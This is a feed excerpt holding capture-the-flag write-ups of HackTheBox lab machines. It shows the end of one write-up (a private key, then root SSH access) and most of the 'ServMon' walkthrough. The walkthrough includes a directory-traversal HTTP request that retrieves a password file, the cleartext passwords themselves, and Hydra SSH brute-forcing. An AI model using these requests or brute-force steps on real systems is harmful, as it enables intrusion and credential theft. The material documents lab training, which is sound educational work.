&lt;span class="code-line"&gt;G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO&lt;/span&gt;
&lt;span class="code-line"&gt;3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC&lt;/span&gt;
&lt;span class="code-line"&gt;vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p&lt;/span&gt;
&lt;span class="code-line"&gt;MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD&lt;/span&gt;
&lt;span class="code-line"&gt;Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn&lt;/span&gt;
&lt;span class="code-line"&gt;5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs&lt;/span&gt;
&lt;span class="code-line"&gt;V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg&lt;/span&gt;
&lt;span class="code-line"&gt;e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8&lt;/span&gt;
&lt;span class="code-line"&gt;6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh&lt;/span&gt;
&lt;span class="code-line"&gt;i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq&lt;/span&gt;
&lt;span class="code-line"&gt;tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW&lt;/span&gt;
&lt;span class="code-line"&gt;woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi&lt;/span&gt;
&lt;span class="code-line"&gt;/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA&lt;/span&gt;
&lt;span class="code-line"&gt;1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW&lt;/span&gt;
&lt;span class="code-line"&gt;J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr&lt;/span&gt;
&lt;span class="code-line"&gt;OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw&lt;/span&gt;
&lt;span class="code-line"&gt;ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo&lt;/span&gt;
&lt;span class="code-line"&gt;ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;With the private key we can directly connect as &lt;code&gt;root&lt;/code&gt; to the local machine and get
the &lt;code&gt;root.txt&lt;/code&gt; flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pain@forwardslash:/tmp/plop$ ssh root@localhost -i mnt/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@forwardslash:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;419f9c340fcc83acccfcbebfe17d2538&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was hard. I don't usually do the hard box as they take so much time.
This one was long and I ask a few questions on the discord channel to avoid
taking too much time on rabbit hole. Nevertheless the box feels good.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="openAdmin"></category><category term="Linux"></category></entry><entry><title>HTB: ServMon</title><link href="https://maggick.fr/2020/06/htb-servmon.html" rel="alternate"></link><published>2020-06-21T09:15:00+02:00</published><updated>2020-06-21T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-21:/2020/06/htb-servmon.html</id><summary type="html">&lt;p&gt;&lt;img alt="ServMon Card" class="align-left" src="/media/2020.06/servmon_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/240"&gt;ServMon&lt;/a&gt; publish on April
11 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt;.
This box is rated as an easy box. This box is really unstable and can be a pain
as there is a lot of reset on public server. It implies an anonymous FTP, a
&lt;code&gt;Passwords.txt&lt;/code&gt; file and two exploits.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.06/servmon_card.png" alt="ServMon Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/240"&gt;ServMon&lt;/a&gt; publish on April
11 2020 by &lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt;.
This box is rated as an easy box. This box is really unstable and can be a pain
as there is a lot of reset on public server. It implies an anonymous FTP, a
&lt;code&gt;Passwords.txt&lt;/code&gt; file and two exploits.&lt;/p&gt;


&lt;h1 id="user-part"&gt;User part&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. As often with Windows Boxes, a lot of
port are open. A few interesting services are up:
  * FTP on port 21
  * SSH (for Windows) on port 22
  * a Web service on port 80
  * a Web service (with SSL) on port 8433&lt;/p&gt;
&lt;p&gt;Here is the full nmap scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Apr 15 03:04:29 2020 as: nmap -p- -sSV -oN nmap 10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65515 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp    open  ftp           Microsoft ftpd&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;5040/tcp  open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;5666/tcp  open  nrpe?&lt;/span&gt;
&lt;span class="code-line"&gt;6063/tcp  open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;6699/tcp  open  napster?&lt;/span&gt;
&lt;span class="code-line"&gt;7680/tcp  open  pando-pub?&lt;/span&gt;
&lt;span class="code-line"&gt;8443/tcp  open  ssl/https-alt&lt;/span&gt;
&lt;span class="code-line"&gt;31336/tcp open  nagios-nsca   Nagios NSCA&lt;/span&gt;
&lt;span class="code-line"&gt;49664/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49665/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49666/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49668/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port80-TCP:V=7.80%I=7%D=4/15%Time=5E96B393%P=x86_64-pc-linux-gnu%r(NULL&lt;/span&gt;
&lt;span class="code-line"&gt;SF:,6B,&amp;quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\r\n&amp;quot;)%r(GetRequest,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex&lt;/span&gt;
&lt;span class="code-line"&gt;SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:20\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20X&lt;/span&gt;
&lt;span class="code-line"&gt;SF:HTML\x201\.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/D&lt;/span&gt;
&lt;span class="code-line"&gt;SF:TD/xhtml1-transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.&lt;/span&gt;
&lt;span class="code-line"&gt;SF:org/1999/xhtml\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x20\x20\x20&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x20\x20\x20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x2&lt;/span&gt;
&lt;span class="code-line"&gt;SF:0\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;SF:%r(HTTPOptions,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm&lt;/span&gt;
&lt;span class="code-line"&gt;SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20XHTML\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x201\.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/DTD/xh&lt;/span&gt;
&lt;span class="code-line"&gt;SF:tml1-transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.org/1&lt;/span&gt;
&lt;span class="code-line"&gt;SF:999/xhtml\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:20\x20&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x20\x20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x20\x20&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;)%r(RT&lt;/span&gt;
&lt;span class="code-line"&gt;SF:SPRequest,1B4,&amp;quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n&lt;/span&gt;
&lt;span class="code-line"&gt;SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;quot;-//W3C//DTD\x20XHTML\x201\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:.0\x20Transitional//EN\&amp;quot;\x20\&amp;quot;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-&lt;/span&gt;
&lt;span class="code-line"&gt;SF:transitional\.dtd\&amp;quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;quot;http://www\.w3\.org/1999/x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:html\&amp;quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x2&lt;/span&gt;
&lt;span class="code-line"&gt;SF:0&amp;lt;script\x20type=\&amp;quot;text/javascript\&amp;quot;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x&lt;/span&gt;
&lt;span class="code-line"&gt;SF:20window\.location\.href\x20=\x20\&amp;quot;Pages/login\.htm\&amp;quot;;\r\n\x20\x20\x20\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/15%Time=5E96B39B%P=x86_64-pc-linux-gn&lt;/span&gt;
&lt;span class="code-line"&gt;SF:u%r(GetRequest,E8,&amp;quot;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation&lt;/span&gt;
&lt;span class="code-line"&gt;SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\0\0\0\0\0\0\&amp;quot;:{\&amp;quot;context\&amp;quot;:\&amp;quot;ini://\${shared-path}/nsclient\.ini\&amp;quot;,\&amp;quot;h&lt;/span&gt;
&lt;span class="code-line"&gt;SF:as_changed\&amp;quot;:false,\&amp;quot;type\&amp;quot;:\&amp;quot;ini\&amp;quot;}}\]}\0\0\x20keyword\x20to\x20the\x2&lt;/span&gt;
&lt;span class="code-line"&gt;SF:0message\x20you\x20can\x20use\x20two\x20syntaxes\x20either\x20\${&amp;quot;)%r(H&lt;/span&gt;
&lt;span class="code-line"&gt;SF:TTPOptions,36,&amp;quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen&lt;/span&gt;
&lt;span class="code-line"&gt;SF:t\x20not\x20found&amp;quot;)%r(FourOhFourRequest,36,&amp;quot;HTTP/1\.1\x20404\r\nContent&lt;/span&gt;
&lt;span class="code-line"&gt;SF:-Length:\x2018\r\n\r\nDocument\x20not\x20found&amp;quot;)%r(RTSPRequest,36,&amp;quot;HTTP&lt;/span&gt;
&lt;span class="code-line"&gt;SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;SF:%r(SIPOptions,36,&amp;quot;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocu&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ment\x20not\x20found&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Apr 15 03:14:06 2020 -- 1 IP address (1 host up) scanned in 577.24 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
&lt;p&gt;Using firefox we can easily connect to the FTP service with an anonymous account.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Connecting to ftp" src="/media/2020.06/servmon_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We found two files:
* Users/Nadine/confidentiel.txt
* Users/Nathan/Notes to do.txt&lt;/p&gt;
&lt;p&gt;The first one contain the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nathan,&lt;/p&gt;
&lt;p&gt;I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.&lt;/p&gt;
&lt;p&gt;Regards&lt;/p&gt;
&lt;p&gt;Nadine&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The second on contain some TODO list:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;1) Change the password for NVMS - Complete&lt;/span&gt;
&lt;span class="code-line"&gt;2) Lock down the NSClient Access - Complete&lt;/span&gt;
&lt;span class="code-line"&gt;3) Upload the passwords&lt;/span&gt;
&lt;span class="code-line"&gt;4) Remove public access to NVMS&lt;/span&gt;
&lt;span class="code-line"&gt;5) Place the secret files in SharePoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Therefore we know that there is a &lt;code&gt;Passwords.txt&lt;/code&gt; file on Nathan's desktop and
that there is two web services : NSClient and NVMS.&lt;/p&gt;
&lt;h2 id="http"&gt;HTTP&lt;/h2&gt;
&lt;p&gt;On port 80 we found the NVSM web services with an authentication form.&lt;/p&gt;
&lt;p&gt;&lt;img alt="NVMS 1000 authentication form" src="/media/2020.06/servmon_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We look at the available exploit for NVMS and we found only one about a
directory traversal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit NVMS&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                         |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                      | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;NVMS 1000 - Directory Traversal        | exploits/hardware/webapps/47774.txt&lt;/span&gt;
&lt;span class="code-line"&gt;OpenVms 5.3/6.2/7.x - UCX POP Server A | exploits/multiple/local/21856.txt&lt;/span&gt;
&lt;span class="code-line"&gt;OpenVms 8.3 Finger Service - Stack Buf | exploits/multiple/dos/32193.txt&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ cat /usr/share/exploitdb/exploits/hardware/webapps/47774.txt&lt;/span&gt;
&lt;span class="code-line"&gt;# Title: NVMS-1000 - Directory Traversal&lt;/span&gt;
&lt;span class="code-line"&gt;# Date: 2019-12-12&lt;/span&gt;
&lt;span class="code-line"&gt;# Author: Numan Türle&lt;/span&gt;
&lt;span class="code-line"&gt;# Vendor Homepage: http://en.tvt.net.cn/&lt;/span&gt;
&lt;span class="code-line"&gt;# Version : N/A&lt;/span&gt;
&lt;span class="code-line"&gt;# Software Link : http://en.tvt.net.cn/products/188.html&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;POC&lt;/span&gt;
&lt;span class="code-line"&gt;---------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 12.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Response&lt;/span&gt;
&lt;span class="code-line"&gt;---------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;; for 16-bit app support&lt;/span&gt;
&lt;span class="code-line"&gt;[fonts]&lt;/span&gt;
&lt;span class="code-line"&gt;[extensions]&lt;/span&gt;
&lt;span class="code-line"&gt;[mci extensions]&lt;/span&gt;
&lt;span class="code-line"&gt;[files]&lt;/span&gt;
&lt;span class="code-line"&gt;[Mail]&lt;/span&gt;
&lt;span class="code-line"&gt;MAPI=1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We fire up burp and make the same request as in the POC (changing the host
obviously). We got the &lt;code&gt;win.ini&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;We then change our request to get the content of the &lt;code&gt;Passwords.txt&lt;/code&gt; file on
Nathan's desktop which give us seven passwords.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Content-type: text/plain&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 156&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;AuthInfo:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;1nsp3ctTh3Way2Mars!&lt;/span&gt;
&lt;span class="code-line"&gt;Th3r34r3To0M4nyTrait0r5!&lt;/span&gt;
&lt;span class="code-line"&gt;B3WithM30r4ga1n5tMe&lt;/span&gt;
&lt;span class="code-line"&gt;L1k3B1gBut7s@W0rk&lt;/span&gt;
&lt;span class="code-line"&gt;0nly7h3y0unGWi11F0l10w&lt;/span&gt;
&lt;span class="code-line"&gt;IfH3s4b0Utg0t0H1sH0me&lt;/span&gt;
&lt;span class="code-line"&gt;Gr4etN3w5w17hMySk1Pa5$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We try this passwords against the NVMS authentication form but without success.&lt;/p&gt;
&lt;h2 id="ssh"&gt;SSH&lt;/h2&gt;
&lt;p&gt;As there is other services, we try our seven password against the SSH service.
We have two users &lt;code&gt;nathan&lt;/code&gt; and &lt;code&gt;nadine&lt;/code&gt;. Using &lt;code&gt;hydra&lt;/code&gt; we easily find the creds
for nadine's SSH account.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_servmon$ hydra -l nathan -P pass ssh://10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:14&lt;/span&gt;
&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] attacking ssh://10.10.10.184:22/&lt;/span&gt;
&lt;span class="code-line"&gt;1 of 1 target completed, 0 valid passwords found&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:19&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/pown/htb_servmon$ hydra -l nadine -P pass ssh://10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 12:28:26&lt;/span&gt;
&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] attacking ssh://10.10.10.184:22/&lt;/span&gt;
&lt;span class="code-line"&gt;[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk&lt;/span&gt;
&lt;span class="code-line"&gt;1 of 1 target successfully completed, 1 valid password found&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-16 12:28:35&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can the connect to the server using SSH and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_servmon$ ssh nadine@10.10.10.184&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.18363.752]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2019 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;nadine@SERVMON C:\Users\Nadine&amp;gt;type Desktop\user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;e9aa044247ca285bb777782d7b0cfdfd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;For the root part we need to exploit the NSClient on port 8443 as there is a
privilege escalation vulnerability.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit NSclient&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                      |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                                    | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;---------------------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;NSClient++ 0.5.2.35 - Privilege Escalation          | exploits/windows/local/46802.txt&lt;/span&gt;
